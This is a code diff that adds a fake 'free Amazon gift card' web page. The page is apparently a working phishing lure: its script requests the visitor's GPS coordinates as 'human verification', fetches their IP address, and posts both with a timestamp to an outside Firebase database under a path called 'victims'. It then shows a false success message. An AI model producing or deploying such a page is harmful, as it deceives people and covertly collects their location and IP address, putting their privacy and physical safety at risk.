@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free Amazon Gift Card!</title>
+</head>
+<body>
+
+<h1>🎁 YOU WON A €50 AMAZON CARD! Just enable location.</h1>
+<p>We need your location to verify you're human...</p>
+
+<script>
+// Hilfsfunktion: Hol IP via API
+async function getIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        return await res.json();
+    } catch (e) {
+        return { ip: 'unknown' };
+    }
+}
+
+// GPS + IP erfassen und zu Firebase senden
+if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(async function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const ipData = await getIP();
+        
+        // Zu Firebase schicken
+        fetch('https://trackmeifyoucan-dc7e8-default-rtdb.europe-west1.firebasedatabase.app/victims.json', {
+            method: 'POST',
+            body: JSON.stringify({
+                lat,
+                lon,
+                ip: ipData.ip,
+                time: new Date().toISOString()
+            })
+        });
+
+        alert("Verification complete! Check your email for the gift card.");
+    }, () => {
+        alert("You denied location... we can't send you the prize!");
+    });
+}
+</script>
+
+</body>
+</html>
